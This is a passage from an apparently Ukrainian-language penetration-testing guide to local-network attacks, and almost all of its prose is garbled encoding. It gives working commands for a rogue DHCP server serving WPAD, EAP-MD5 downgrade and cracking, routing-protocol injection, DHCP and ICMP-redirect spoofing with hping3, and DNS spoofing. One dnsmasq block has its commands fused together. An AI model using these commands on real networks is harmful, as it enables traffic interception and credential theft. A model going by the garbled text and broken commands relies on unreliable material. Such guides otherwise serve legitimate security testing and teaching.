–ü—Ä–∞–≤–∏–ª—å–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏, –º–æ–∂–Ω–∞ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–π DHCP —Å–µ—Ä–≤–µ—Ä –¥–ª—è –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ–≥–æ –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ —Ç—Ä–∞—Ñ—ñ–∫—É.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **–ê—Ç–∞–∫–∏ EAP**

–û—Å—å –¥–µ—è–∫—ñ —Ç–∞–∫—Ç–∏–∫–∏ –∞—Ç–∞–∫–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—Ä–æ—Ç–∏ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ–π 802.1X:

* –ê–∫—Ç–∏–≤–Ω–µ –ø–µ—Ä–µ–±–æ—Ä–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—è –º–µ—Ç–æ–¥–æ–º EAP
* –ê—Ç–∞–∫–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä RADIUS –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–µ–∫–æ—Ä–µ–∫—Ç–Ω–æ–≥–æ –≤–º—ñ—Å—Ç—É EAP _\*\*_(–µ–∫—Å–ø–ª–æ–π—Ç–∏)
* –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è EAP —Ç–∞ –æ—Ñ–ª–∞–π–Ω-–≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—è (EAP-MD5 —Ç–∞ PEAP)
* –ü—Ä–∏–º—É—Å–æ–≤–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è EAP-MD5 –¥–ª—è –æ–±—Ö—ñ–¥—É –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ TLS
* –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ —Ç—Ä–∞—Ñ—ñ–∫—É –ø—Ä–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–Ω—Ü–µ–Ω—Ç—Ä–∞—Ç–æ—Ä–∞ –∞–±–æ –ø–æ–¥—ñ–±–Ω–æ–≥–æ

–Ø–∫—â–æ –∞—Ç–∞–∫—É—é—á–∏–π –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –º—ñ–∂ –∂–µ—Ä—Ç–≤–æ—é —Ç–∞ —Å–µ—Ä–≤–µ—Ä–æ–º –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –≤—ñ–Ω –º–æ–∂–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–Ω–∏–∑–∏—Ç–∏ (—è–∫—â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ) –ø—Ä–æ—Ç–æ–∫–æ–ª –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–æ EAP-MD5 —Ç–∞ –∑–∞—Ö–æ–ø–∏—Ç–∏ —Å–ø—Ä–æ–±—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ü–æ—Ç—ñ–º –≤—ñ–Ω –º–æ–∂–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–ª–∞–º–∞—Ç–∏ —Ü–µ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏:
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### –ê—Ç–∞–∫–∏ –Ω–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏ FHRP (GLBP —Ç–∞ HSRP) <a href="#6196" id="6196"></a>

**FHRP** (–ü—Ä–æ—Ç–æ–∫–æ–ª –ø–µ—Ä—à–æ–≥–æ –∫—Ä–æ–∫—É —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è) - —Ü–µ –∫–ª–∞—Å –º–µ—Ä–µ–∂–µ–≤–∏—Ö –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏—Ö –¥–ª—è **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –≥–∞—Ä—è—á–æ—ó —Ä–µ–∑–µ—Ä–≤–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó**. –ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é FHRP —Ñ—ñ–∑–∏—á–Ω—ñ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –æ–±'—î–¥–Ω–∞–Ω—ñ –≤ –æ–¥–∏–Ω –ª–æ–≥—ñ—á–Ω–∏–π –ø—Ä–∏—Å—Ç—Ä—ñ–π, —â–æ –∑–±—ñ–ª—å—à—É—î —Å—Ç—ñ–π–∫—ñ—Å—Ç—å –¥–æ –≤—ñ–¥–º–æ–≤ —Ç–∞ –¥–æ–ø–æ–º–∞–≥–∞—î —Ä–æ–∑–ø–æ–¥—ñ–ª–∏—Ç–∏ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.

**–Ü–Ω–∂–µ–Ω–µ—Ä–∏ –∫–æ–º–ø–∞–Ω—ñ—ó Cisco Systems —Ä–æ–∑—Ä–æ–±–∏–ª–∏ –¥–≤–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏ FHRP, GLBP —Ç–∞ HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

–í—ñ–¥–æ–º–æ, —â–æ —ñ—Å–Ω—É—é—Ç—å —Ç—Ä–∏ –≤–µ—Ä—Å—ñ—ó –ø—Ä–æ—Ç–æ–∫–æ–ª—É –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó (RIP): RIP, RIPv2 —Ç–∞ RIPng. –î–∞—Ç–∞–≥—Ä–∞–º–∏ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è –ø—ñ—Ä–∏–Ω–≥–∞–º —á–µ—Ä–µ–∑ –ø–æ—Ä—Ç 520 –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é UDP –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é RIP —Ç–∞ RIPv2, —Ç–æ–¥—ñ —è–∫ –¥–∞—Ç–∞–≥—Ä–∞–º–∏ —Ç—Ä–∞–Ω—Å–ª—é—é—Ç—å—Å—è –Ω–∞ UDP-–ø–æ—Ä—Ç 521 —á–µ—Ä–µ–∑ –º—É–ª—å—Ç—ñ–∫–∞—Å—Ç IPv6 –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é RIPng. –ü—ñ–¥—Ç—Ä–∏–º–∫–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó MD5 –±—É–ª–∞ –≤–≤–µ–¥–µ–Ω–∞ –≤ RIPv2. –ó —ñ–Ω—à–æ–≥–æ –±–æ–∫—É, –≤ RIPng –Ω–µ –≤–∫–ª—é—á–µ–Ω–æ –≤–±—É–¥–æ–≤–∞–Ω—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é; –∑–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –Ω–µ–æ–±–æ–≤'—è–∑–∫–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ IPsec AH —Ç–∞ ESP –≤ –º–µ—Ä–µ–∂—ñ IPv6.

- **RIP —Ç–∞ RIPv2:** –ö–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—è –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —á–µ—Ä–µ–∑ UDP-–¥–∞—Ç–∞–≥—Ä–∞–º–∏ –Ω–∞ –ø–æ—Ä—Ç—É 520.
- **RIPng:** –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î UDP-–ø–æ—Ä—Ç 521 –¥–ª—è —Ç—Ä–∞–Ω—Å–ª—è—Ü—ñ—ó –¥–∞—Ç–∞–≥—Ä–∞–º —á–µ—Ä–µ–∑ –º—É–ª—å—Ç—ñ–∫–∞—Å—Ç IPv6.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ RIPv2 –ø—ñ–¥—Ç—Ä–∏–º—É—î –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é MD5, —Ç–æ–¥—ñ —è–∫ RIPng –Ω–µ –º–∞—î –≤–±—É–¥–æ–≤–∞–Ω–æ—ó –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –ø–æ–∫–ª–∞–¥–∞—é—á–∏—Å—å –Ω–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∏ IPsec AH —Ç–∞ ESP –≤ IPv6.

### –ê—Ç–∞–∫–∏ –Ω–∞ EIGRP

**EIGRP (–ü—Ä–æ—Ç–æ–∫–æ–ª –ø–æ–∫—Ä–∞—â–µ–Ω–æ—ó –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó —à–ª—é–∑–æ–≤–æ—ó –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó)** - —Ü–µ –¥–∏–Ω–∞–º—ñ—á–Ω–∏–π –ø—Ä–æ—Ç–æ–∫–æ–ª –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó. **–¶–µ –ø—Ä–æ—Ç–æ–∫–æ–ª –≤–µ–∫—Ç–æ—Ä–∞ –≤—ñ–¥—Å—Ç–∞–Ω—ñ.** –Ø–∫—â–æ **–Ω–µ–º–∞—î –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –ø–∞—Å–∏–≤–Ω–∏—Ö —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ–≤, **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫** –º–æ–∂–µ –≤—Ç—Ä—É—Ç–∏—Ç–∏—Å—è –≤ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—é EIGRP —Ç–∞ —Å–ø—Ä–∏—á–∏–Ω–∏—Ç–∏ **–∑–∞—Ç—Ä—É—î–Ω–Ω—è —Ç–∞–±–ª–∏—Ü—å –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó**. –ö—Ä—ñ–º —Ç–æ–≥–æ, –º–µ—Ä–µ–∂–∞ EIGRP (—ñ–Ω—à–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, –∞–≤—Ç–æ–Ω–æ–º–Ω–∞ —Å–∏—Å—Ç–µ–º–∞) **—î –ø–ª–æ—Å–∫–æ—é —ñ –Ω–µ –º–∞—î —Å–µ–≥–º–µ–Ω—Ç–∞—Ü—ñ—ó –Ω–∞ –±—É–¥—å-—è–∫—ñ –∑–æ–Ω–∏**. –Ø–∫—â–æ **–∞—Ç–∞–∫—É–≤–∞—á –≤–ø—Ä–æ–≤–∞–¥–∂—É—î –º–∞—Ä—à—Ä—É—Ç**, –π–º–æ–≤—ñ—Ä–Ω–æ, —â–æ —Ü–µ–π –º–∞—Ä—à—Ä—É—Ç **—Ä–æ–∑–ø–æ–≤—Å—é–¥–∏—Ç—å—Å—è** –ø–æ –≤—Å—ñ–π –∞–≤—Ç–æ–Ω–æ–º–Ω—ñ–π —Å–∏—Å—Ç–µ–º—ñ EIGRP.

–î–ª—è –∞—Ç–∞–∫–∏ –Ω–∞ —Å–∏—Å—Ç–µ–º—É EIGRP –ø–æ—Ç—Ä—ñ–±–Ω–æ **–≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Å—É—Å—ñ–¥—Å—Ç–≤–æ –∑ –ª–µ–≥—ñ—Ç–∏–º –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–æ–º EIGRP**, —â–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—î –±–∞–≥–∞—Ç–æ –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π, –≤—ñ–¥ –±–∞–∑–æ–≤–æ–≥–æ —Ä–æ–∑–≤—ñ–¥—É–≤–∞–Ω–Ω—è –¥–æ —Ä—ñ–∑–Ω–∏—Ö –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω—å.

[**FRRouting**](https://frrouting.org/) –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º —Ä–µ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ **–≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏–π –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä, —è–∫–∏–π –ø—ñ–¥—Ç—Ä–∏–º—É—î BGP, OSPF, EIGRP, RIP —Ç–∞ —ñ–Ω—à—ñ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏.** –í–∞–º –ø—Ä–æ—Å—Ç–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ —Ä–æ–∑–≥–æ—Ä–Ω—É—Ç–∏ –π–æ–≥–æ –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ –≤–∞—à–æ–≥–æ –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫–∞, —ñ –≤–∏ —Ñ–∞–∫—Ç–∏—á–Ω–æ –º–æ–∂–µ—Ç–µ –ø—Ä–µ—Ç–µ–Ω–¥—É–≤–∞—Ç–∏ –Ω–∞ —Ä–æ–ª—å –ª–µ–≥—ñ—Ç–∏–º–Ω–æ–≥–æ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞ –≤ –¥–æ–º–µ–Ω—ñ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) –º–∞—î –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–ª—è –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è –º–æ–≤–ª–µ–Ω–Ω—è EIGRP (–ü—Ä–æ—Ç–æ–∫–æ–ª –ø–æ–∫—Ä–∞—â–µ–Ω–æ—ó –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó —à–ª—é–∑–æ–≤–æ—ó –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó). –¢–∞–∫–æ–∂ –≤—ñ–Ω –¥–æ–∑–≤–æ–ª—è—î –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –ø–∞–∫–µ—Ç—ñ–≤, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –∑–º—ñ–Ω–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó.

### OSPF

–£ –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ Open Shortest Path First (OSPF) **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è MD5 —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –±–µ–∑–ø–µ—á–Ω–æ–≥–æ –∑–≤'—è–∑–∫—É –º—ñ–∂ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞–º–∏**. –û–¥–Ω–∞–∫ —Ü—è –∑–∞—Ö–∏—Å–Ω–∞ –º—ñ—Ä–∞ –º–æ–∂–µ –±—É—Ç–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ Loki —Ç–∞ John the Ripper. –¶—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –∑–¥–∞—Ç–Ω—ñ –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ —Ç–∞ —Ä–æ–∑–∫—Ä–∏–≤–∞—Ç–∏ —Ö–µ—à—ñ MD5, —Ä–æ–∑–∫—Ä–∏–≤–∞—é—á–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ–π–Ω–∏–π –∫–ª—é—á. –Ø–∫ —Ç—ñ–ª—å–∫–∏ —Ü–µ–π –∫–ª—é—á –æ—Ç—Ä–∏–º–∞–Ω–æ, –π–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –≤–≤–µ–¥–µ–Ω–Ω—è –Ω–æ–≤–æ—ó –º–∞—Ä—à—Ä—É—Ç–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó. –î–ª—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ –º–∞—Ä—à—Ä—É—Ç—É —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –∫–ª—é—á–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –≤–∫–ª–∞–¥–∫–∏ _Injection_ —Ç–∞ _Connection_.

- **–ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ —Ä–æ–∑–∫—Ä–∏—Ç—Ç—è —Ö–µ—à—ñ–≤ MD5:** –î–ª—è —Ü—å–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ Loki —Ç–∞ John the Ripper.
- **–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ –º–∞—Ä—à—Ä—É—Ç—É:** –¶–µ —Ä–æ–±–∏—Ç—å—Å—è —á–µ—Ä–µ–∑ –≤–∫–ª–∞–¥–∫—É _Injection_.
- **–í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –∫–ª—é—á–∞:** –ö–ª—é—á –Ω–∞–ª–∞—à—Ç–æ–≤—É—î—Ç—å—Å—è –ø—ñ–¥ –≤–∫–ª–∞–¥–∫–æ—é _Connection_.

### –Ü–Ω—à—ñ –∑–∞–≥–∞–ª—å–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ —Ç–∞ –¥–∂–µ—Ä–µ–ª–∞

* [**Above**](https://github.com/c4s73r/Above): –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ —Ç—Ä–∞—Ñ—ñ–∫—É —Ç–∞ –ø–æ—à—É–∫—É –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π
* –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –¥–µ—è–∫—É **–¥–æ–¥–∞—Ç–∫–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –º–µ—Ä–µ–∂–µ–≤—ñ –∞—Ç–∞–∫–∏ [—Ç—É—Ç](https://github.com/Sab0tag3d/MITM-cheatsheet)**.

## **–ü—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è**

–ê—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –Ω–∞–ª–∞—à—Ç–æ–≤—É—î –≤—Å—ñ –º–µ—Ä–µ–∂–µ–≤—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ (–®–ü–î, IP, DNS) –Ω–æ–≤–æ–≥–æ —É—á–∞—Å–Ω–∏–∫–∞ –º–µ—Ä–µ–∂—ñ, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ —Ñ–∞–ª—å—à–∏–≤—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP –ü—ñ–¥—Ä–æ–±–∫–∞

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [–ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —Ä–æ–∑–¥—ñ–ª](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î—Ç—å—Å—è –ø–∞–∫–µ—Ç ICMP —Ç–∏–ø—É 1 –∫–æ–¥ 5, —è–∫–∏–π –≤–∫–∞–∑—É—î, —â–æ –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ —î –Ω–∞–π–∫—Ä–∞—â–∏–º —à–ª—è—Ö–æ–º –¥–æ IP. –ü–æ—Ç—ñ–º, –∫–æ–ª–∏ –∂–µ—Ä—Ç–≤–∞ —Ö–æ—á–µ –∑–≤'—è–∑–∞—Ç–∏—Å—è –∑ IP, –≤–æ–Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç—å –ø–∞–∫–µ—Ç —á–µ—Ä–µ–∑ –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫–∞.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

–ê—Ç–∞–∫—É—é—á–∏–π –±—É–¥–µ —Ä–æ–∑–≤'—è–∑—É–≤–∞—Ç–∏ –¥–µ—è–∫—ñ (–∞–±–æ –≤—Å—ñ) –¥–æ–º–µ–Ω–∏, —è–∫—ñ –∑–∞–ø–∏—Ç—É—î –∂–µ—Ä—Ç–≤–∞.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –≤–ª–∞—Å–Ω–æ–≥–æ DNS –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### –õ–æ–∫–∞–ª—å–Ω—ñ —à–ª—é–∑–∏

–ß–∞—Å—Ç–æ —ñ—Å–Ω—É—î –∫—ñ–ª—å–∫–∞ –º–∞—Ä—à—Ä—É—Ç—ñ–≤ –¥–æ —Å–∏—Å—Ç–µ–º —Ç–∞ –º–µ—Ä–µ–∂. –ü—ñ—Å–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–ø–∏—Å–∫—É MAC-–∞–¥—Ä–µ—Å —É –ª–æ–∫–∞–ª—å–Ω—ñ–π –º–µ—Ä–µ–∂—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ _gateway-finder.py_ –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ö–æ—Å—Ç—ñ–≤, —è–∫—ñ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å –ø–µ—Ä–µ—Å–∏–ª–∞–Ω–Ω—è IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [–ü—ñ–¥—Ä–æ–±–∫–∞ LLMNR, NBT-NS —Ç–∞ mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

–î–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤–∏—Ä—ñ—à–µ–Ω–Ω—è —ñ–º–µ–Ω —Ö–æ—Å—Ç—ñ–≤, –∫–æ–ª–∏ DNS-–∑–∞–ø–∏—Ç–∏ –Ω–µ–≤–¥–∞–ª–∏—Å—å, —Å–∏—Å—Ç–µ–º–∏ Microsoft –ø–æ–∫–ª–∞–¥–∞—é—Ç—å—Å—è –Ω–∞ **Link-Local Multicast Name Resolution (LLMNR)** —Ç–∞ **NetBIOS Name Service (NBT-NS)**. –¢–∞–∫ —Å–∞–º–æ, **Apple Bonjour** —Ç–∞ **Linux zero-configuration** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å **Multicast DNS (mDNS)** –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Å–∏—Å—Ç–µ–º —É –º–µ—Ä–µ–∂—ñ. –ß–µ—Ä–µ–∑ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ü–∏—Ö –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤ —Ç–∞ —ó—Ö–Ω—é —Ä–æ–±–æ—Ç—É —á–µ—Ä–µ–∑ UDP, —Ä–æ–∑—Å–∏–ª–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å, —ó—Ö –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –∑ –º–µ—Ç–æ—é –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –Ω–∞ —à–∫—ñ–¥–ª–∏–≤—ñ —Å–µ—Ä–≤—ñ—Å–∏.

–í–∏ –º–æ–∂–µ—Ç–µ –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ —Å–µ—Ä–≤—ñ—Å–∏, —è–∫—ñ —à—É–∫–∞—é—Ç—å—Å—è —Ö–æ—Å—Ç–∞–º–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Responder –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —Ñ–∞–ª—å—à–∏–≤–∏—Ö –≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π.\
